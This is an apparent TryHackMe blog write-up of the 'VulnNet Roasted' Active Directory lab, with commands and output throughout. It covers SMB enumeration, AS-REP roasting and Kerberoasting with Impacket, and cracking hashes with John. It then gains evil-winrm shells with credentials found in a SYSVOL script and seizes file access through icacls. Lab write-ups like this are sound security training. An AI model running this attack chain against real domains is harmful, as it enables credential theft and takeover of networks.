---
categories: [TryHackMe]
tags: [ Active Directory, ASREPRoast, GetUserSPNs.py, GetNPUsers.py, PrivEsc, SMB, Kerberosting, icacls, recon]
media_subpath: /assets/images/
image:
  path: vulnNet-Roasted.png
  width: "1200"
  height: "630"
  alt: Active Directory Easy Level Machine 🎖️
---
## Port Scan Results ⤵️
```bash
┌──(kali🔥kali)-[~/Downloads/Tryhackme/VulnNet_Roasted]
└─$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.138.220 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 21:26 IST
Nmap scan report for 10.10.138.220
Host is up (0.20s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-26 16:00:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -1s
| smb2-time: 
|   date: 2024-02-26T16:01:04
|_  start_date: N/A
```
{: .nolineno}
## SMB Enumeration ⤵️

I got this domain name from this null credentials login attempt 🔽
![Image](Pasted%20image%2020240226221215.png)
_Domain Name is ▶️ vulnnet-rst.local_
Lets see the share access with Anonymous login or not 🔽
![Image](Pasted%20image%2020240226221107.png)
_READ Access on smb shares_
> If I get the **<span style="color:#00ff91">IPC$</span>** share access that means that I can enumerate users through netexec tool.
{: .prompt-tip }

I got the usernames and the group names like this 🔽
![Image](Pasted%20image%2020240226215905.png)
_User and Group enum with netexec_
Lets collect them in a file 🔽
```bash
┌──(kali🔥kali)-[~/Downloads/Tryhackme/VulnNet_Roasted]
└─$ cat a.txt| cut -d '\' -f 2 | grep SidTypeUser | awk '{print $1}'
Administrator
Guest
krbtgt
WIN-2BO8M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
```
{: .nolineno}
I then performed **<span style="color:#61ffe5">AS-REP-ROASTING</span>** using `GetNPUsers.py` Tool from impackets and I got this result 🔽
```bash
┌──(kali🔥kali)-[~/Downloads/Tryhackme/VulnNet_Roasted]
└─$ /opt/Tools/impacket/examples/GetNPUsers.py -no-pass 'vulnnet-rst.local/' -dc-ip 10.10.138.220 -request -usersfile users.txt
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User Administrator does not have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest does not have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ does not have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn does not have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat does not have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:29348c9e50198d204c7491fd8dbba0e1$493e494302848c63a455af3884030a662b7c692db761741ba02ba13d92444ff0e53a3bc48b1e7269753da98c823c16fb98da95228c4b7ad6b4afc9c0a5e0df950ef6344a53fce85095736b4f6776e95459f6c661ce99caeae0a6e1a181cc342fd0012ec5f045f5a758ede9dde10a926fa119e43a4782b581bd3cd95fdc70b3da473d41c7374f0be174b6e559df37fcbeedb1a4c45a980c2fdee0864bbb0fb658502f9af741732a991d73217cb71d540576b6e0491abd5f0ba97bd43a01fc020dc786cc62475808a7cdb28249adb91f6ed1f7aa5931f2f3912176e7d1bd5c2770f940866ab2909c9b501671938cfc18516fa4d66c7cd7
[-] User j-goldenhand does not have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet does not have UF_DONT_REQUIRE_PREAUTH set
```
{: .nolineno}
Now I will be using John The Ripper to crack this hash value 🔻
```bash
┌──(kali🔥kali)-[~/Downloads/Tryhackme/VulnNet_Roasted]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<PASSWORD>        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)     
1g 0:00:00:09 DONE (2024-02-26 22:08) 0.1003g/s 318806p/s 318806c/s 318806C/s 
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
{: .nolineno}
Now lets see what privileges does this user got 🔽
![Image](Pasted%20image%2020240226221910.png)
_Some more Shares READ access now_
Now I have a users credentials so lets try to enumerate the SPN ticket of a user if I could using impacket tool `GetUserSPNs.py` 🔽
![Image](Pasted%20image%2020240227132041.png)
_SPN ticket of user enterprise-core-vn_
Lets crack this ticket with John The Ripper again 🔽
![Image](Pasted%20image%2020240227132321.png)
_Got the Password of user enterprise-core-vn_
Lets see the privileges of this user with netexec Tool ⏬
![Image](Pasted%20image%2020240227132808.png)
_Got Access to winrm session !_
Lets have a winrm session 🔻
### WINRM SHELL ⏩

```powershell
┌──(kali🔥kali)-[~/Downloads/Tryhackme/VulnNet_Roasted]
└─$ evil-winrm -i 10.10.32.88 -u 'enterprise-core-vn' -p '<PASSWORD>'

Evil-WinRM shell v3.5

*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> cd ..
*Evil-WinRM* PS C:\Users\enterprise-core-vn>
*Evil-WinRM* PS C:\Users\enterprise-core-vn> tree /f /a
Folder PATH listing
Volume serial number is 58D0-66AA
C:.
+---Desktop
|       user.txt
|
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
\---Videos
*Evil-WinRM* PS C:\Users\enterprise-core-vn> cat Desktop\user.txt
THM{FLAG_FLAG_FLAG_FLAG_FLAG}
*Evil-WinRM* PS C:\Users\enterprise-core-vn> 
```
{: .nolineno}
Now I looked into SMB shares for some new file access 🔽
```bash
┌──(kali🔥kali)-[~/Downloads/Tryhackme/VulnNet_Roasted]
└─$ smbclient //10.10.168.48/SYSVOL -U enterprise-core-vn
Password for [WORKGROUP\enterprise-core-vn]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 12 00:49:49 2021
  ..                                  D        0  Fri Mar 12 00:49:49 2021
  vulnnet-rst.local                  Dr        0  Fri Mar 12 00:49:49 2021

		8771839 blocks of size 4096. 4555371 blocks available
smb: \> cd vulnnet-rst.local\
smb: \vulnnet-rst.local\> ls
  .                                   D        0  Fri Mar 12 00:53:40 2021
  ..                                  D        0  Fri Mar 12 00:53:40 2021
  DfsrPrivate                      DHSr        0  Fri Mar 12 00:53:40 2021
  Policies                            D        0  Fri Mar 12 00:50:26 2021
  scripts                             D        0  Wed Mar 17 04:45:49 2021

		8771839 blocks of size 4096. 4555371 blocks available
smb: \vulnnet-rst.local\> cd scripts
smb: \vulnnet-rst.local\scripts\> ls
  .                                   D        0  Wed Mar 17 04:45:49 2021
  ..                                  D        0  Wed Mar 17 04:45:49 2021
  ResetPassword.vbs                   A     2821  Wed Mar 17 04:48:14 2021

		8771839 blocks of size 4096. 4555371 blocks available
smb: \vulnnet-rst.local\scripts\> get ResetPassword.vbs 
getting file \vulnnet-rst.local\scripts\ResetPassword.vbs of size 2821 as ResetPassword.vbs (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
smb: \vulnnet-rst.local\scripts\> exit
```
{: .nolineno}
I downloaded this **<span style="color:#fd77f8">ResetPassword.vbs</span>** and found the credentials for a new user 🔻
```bash
strUserNTName = "a-whitehat"
strPassword = "<PASSWORD>"
```
{: .nolineno}
Lets see its privileges in bloodhound also 🔽
![Image](Pasted%20image%2020240227195623.png)
_BloodHound ingestor_
And from bloodhound I got that this user is a part of Domain Admin group directly 🔽
![Image](Pasted%20image%2020240227195822.png)
_Bloodhound pattern map_
That means I am Administrator technically so lets access the flag now 🔽
```powershell
┌──(kali🔥kali)-[~/Downloads/Tryhackme/VulnNet_Roasted]
└─$ evil-winrm -i 10.10.168.48 -u 'a-whitehat' -p '<PASSWORD>'
  
Evil-WinRM shell v3.5
   
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\a-whitehat\Documents> cd ..
*Evil-WinRM* PS C:\Users\a-whitehat> tree /f /a
Folder PATH listing
Volume serial number is 58D0-66AA
C:.
+---Desktop
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
\---Videos
*Evil-WinRM* PS C:\Users\a-whitehat> net user a-whitehat
User name                    a-whitehat
Full Name                    Alexa Whitehat
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/11/2021 11:47:12 AM
Password expires             Never
Password changeable          3/12/2021 11:47:12 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Admins        *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\a-whitehat> cd ..
*Evil-WinRM* PS C:\Users> cd Administrator
*Evil-WinRM* PS C:\Users\Administrator> tree /f /a
Folder PATH listing
Volume serial number is 58D0-66AA
C:.
+---3D Objects
+---Contacts
+---Desktop
|       system.txt
|
+---Documents
+---Downloads
+---Favorites
|   |   Bing.url
|   |
|   \---Links
+---Links
|       Desktop.lnk
|       Downloads.lnk
|
+---Music
+---Pictures
+---Saved Games
+---Searches
\---Videos
*Evil-WinRM* PS C:\Users\Administrator> cat Desktop\system.txt
Access to the path 'C:\Users\Administrator\Desktop\system.txt' is denied.
At line:1 char:1
+ cat Desktop\system.txt
+ ~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Admini...ktop\system.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
*Evil-WinRM* PS C:\Users\Administrator>
```
{: .nolineno}
I can't access <span style="color:#ffff00">system.txt</span> file so lets check the permissions of this file 🔽
```powershell
*Evil-WinRM* PS C:\Users\Administrator> icacls Desktop\system.txt
Desktop\system.txt NT AUTHORITY\SYSTEM:(F)
                   VULNNET-RST\Administrator:(F)

Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\Users\Administrator>
```
{: .nolineno}
Now I see that I am user **<span style="color:#ffff00">a-whitehat</span>** so I don't have access to this file but I can change permissions like this 🔽
```powershell
*Evil-WinRM* PS C:\Users\Administrator> icacls C:\Users\Administrator\Desktop\system.txt /grant a-whitehat:f
processed file: C:\Users\Administrator\Desktop\system.txt
Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\Users\Administrator> cat Desktop\system.txt
THM{FLAG_FLAG_FLAG_FLAG_FLAG}
*Evil-WinRM* PS C:\Users\Administrator> icacls Desktop\system.txt
Desktop\system.txt VULNNET-RST\a-whitehat:(F)
                   NT AUTHORITY\SYSTEM:(F)
                   VULNNET-RST\Administrator:(F)

Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\Users\Administrator>
```
{: .nolineno}
For Administrator shell I could run `secretsdump.py` that will extract the `NTLM` hash for all the users but I am happy with **<span style="color:#ffff00">a-whitehat</span>** user .
I am <span style="color:#61ffe5">Domain Admin</span> now !!

> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }